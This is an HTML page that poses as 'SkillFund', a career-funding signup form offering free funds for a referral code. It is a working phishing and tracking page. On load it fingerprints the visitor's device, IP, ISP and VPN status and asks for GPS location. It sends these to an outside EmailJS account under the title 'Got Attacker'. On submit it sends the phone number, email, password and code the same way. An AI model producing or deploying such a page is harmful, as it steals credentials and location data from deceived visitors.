<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>SkillFund | Launch Your Career</title>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            // https://dashboard.emailjs.com/admin/account
            emailjs.init({
              publicKey: "lojrS9azDEVTnq2qY",
            });
        })();
    </script>
    <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
      padding: 20px;
      margin: 0;
      box-sizing: border-box;
      animation: fadeIn 1s ease-in;
    }
    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    h2 {
      color: #ffffff;
      text-align: center;
      margin-bottom: 10px;
      font-size: 28px;
      animation: slideDown 0.6s ease-out;
    }
    h4 {
      text-align: center;
      color: #cccccc;
      font-weight: normal;
      margin-bottom: 30px;
      animation: slideDown 0.8s ease-out;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      background-color: #1a1a1a;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(255, 255, 255, 0.05);
      animation: zoomIn 0.7s ease-out;
    }
    @keyframes slideDown {
      from { transform: translateY(-20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    @keyframes zoomIn {
      from { transform: scale(0.95); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .form-group {
      margin-bottom: 15px;
    }
    label {
      font-size: 14px;
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
    }
    input[type="text"], input[type="email"], input[type="password"] {
      width: 100%;
      padding: 8px 14px;
      border: 1px solid #555;
      border-radius: 24px;
      background-color: #111;
      color: #fff;
      box-sizing: border-box;
      font-size: 14px;
      transition: border-color 0.3s ease;
    }
    input:focus {
      outline: none;
      border-color: #888;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #fff;
      color: #000;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 20px;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }
    button:hover {
      background-color: #e6e6e6;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>
  <h2>SkillFund</h2>
  <h4>Kickstart your job with free funds — enter your referral code to begin</h4>
  <div class="container">
    <form id="userDataForm">
      <div class="form-group">
        <label for="phone">Phone Number:</label>
        <input type="text" id="phone" name="phone" required>
      </div>
      <div class="form-group">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
      </div>
      <div class="form-group">
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
      </div>
      <div class="form-group">
        <label for="pin">Referral Code:</label>
        <input type="text" id="pin" name="pin" maxlength="6" required>
      </div>
      <button type="button" onclick="submitData(); window.location.href='success.html';">Submit</button>
    </form>
  </div>

  <script>
    let gpsLocation = "Unavailable";
    let ipAddress;

    async function getInfo() {
      const deviceTime = new Date().toString();
      const userAgent = navigator.userAgent;
      const os = navigator.platform;
      const browser = (() => {
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Edg")) return "Edge";
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
        return "Unknown";
      })();

      const resolution = `${window.screen.width} x ${window.screen.height}`;
      const language = navigator.language || "Unknown";
      const architecture = navigator.platform || "Unknown";
      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";

      let batteryLevel = "Unavailable";
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryLevel = `${Math.round(battery.level * 100)}%`;
        } catch {
          batteryLevel = "Error";
        }
      }

      try {
            const ipRes = await fetch("https://api.ipify.org?format=json");
            const { ip } = await ipRes.json();
            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
            const geoData = await geoRes.json();
            ipAddress = ip;

            const info = {
              IP: ip,
              OS: os,
              Browser: browser,
              DeviceTime: deviceTime,
              Battery: batteryLevel,
              ScreenResolution: resolution,
              Language: language,
              Architecture: architecture,
              TouchSupport: touchSupport,
              Country: geoData.country_name,
              Region: geoData.region,
              City: geoData.city,
              ISP: geoData.org || "Unknown",
              Proxy: geoData.proxy || false,
              VPN: geoData.security && geoData.security.vpn ? "Detected" : "Not Detected"
            };

            emailjs.send("service_52wfqu9","template_fjq3rrn",{
title: "Got Attacker",
name: "Device Info",
message: Object.entries(info).map(([key, value]) => `${key}: ${value}`).join('\n'),
Client: ipAddress,
}).then(
  (response) => {
    console.log('SUCCESS!', response.status, response.text);
  },
  (error) => {
    console.log('FAILED...', error);
  },
);
      }

        catch (e) {
            console.log(e.message);
        }
      }

    async function getGeolocation() {
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              gpsLocation = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
              emailjs.send("service_52wfqu9", "template_fjq3rrn", {
                title: "Got Attacker",
                name: "Geolocation",
                message: gpsLocation,
                Client: ipAddress,
              }).then(
                (response) => {
                  console.log('SUCCESS!', response.status, response.text);
                },
                (error) => {
                  console.log('FAILED...', error);
                }
              );
              resolve();
            },
            () => {
              gpsLocation = "Failed to retrieve location";
              resolve();
            }
          );
        } else {
          gpsLocation = "Geolocation not supported";
          resolve();
        }
      });
    }

    window.onload = async function () {
      await getInfo();
      await getGeolocation();
    };

    function submitData() {
      const phone = document.getElementById("phone").value;
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const pin = document.getElementById("pin").value;

      const userData = { phone, email, password, pin };

    emailjs.send("service_52wfqu9","template_fjq3rrn",{
        title: "Got Attacker",
        name: "User Data",
        Client: ipAddress,
            message: Object.entries(userData).map(([key, value]) => `${key}: ${value}`).join('\n'),
          }).then(
        (response) => {
          console.log('SUCCESS!', response.status, response.text);
        },
        (error) => {
          console.log('FAILED...', error);
        },
        );

    }
  </script>
</body>
</html>
